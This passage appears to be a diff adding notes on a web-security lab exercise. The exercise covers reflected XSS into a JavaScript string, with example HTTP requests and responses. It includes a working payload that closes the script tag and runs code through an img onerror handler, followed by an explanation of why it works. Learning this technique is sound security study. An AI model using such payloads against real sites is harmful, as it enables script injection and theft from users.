@@ -177,3 +177,38 @@ which gets converted to:
 
 Here, the first backslash means that the second backslash is interpreted literally, and not as a special character. 
 This means that the quote is now interpreted as a string terminator, and so the attack succeeds.   
+
+### Reflected XSS into a JavaScript string with single quote and backslash escaped
+req
+```HTTP
+GET /?search=phone HTTP/2
+```
+resp
+```java script
+ <script>
+    var searchTerms = 'phone';
+    document.write('<img src="/resources/images/tracker.gif? 
+    searchTerms='+encodeURIComponent(searchTerms)+'">');
+</script>
+```
+req
+```HTTP
+GET /?search=</script><img src=1 onerror=alert(document.domain)> HTTP/2
+```
+resp
+```js
+<script>
+     var searchTerms = '</script><img src=1 onerror=alert(document.domain)>';
+     document.write('<img src="/resources/images/tracker.gif? 
+     searchTerms='+encodeURIComponent(searchTerms)+'">');
+</script>
+```
+The payload `</script><img src=1 onerror=alert(document.domain)>` can be used to break out of the existing JavaScript and execute your own:
+
+The reason this works is that the browser first performs HTML parsing to identify the page elements including blocks of script, and only later performs JavaScript parsing to understand and execute the embedded scripts. 
+
+**The above payload leaves the original script broken, with an unterminated string literal. But that doesn't prevent the subsequent script being parsed and executed in the normal way.**
+
+
+
+
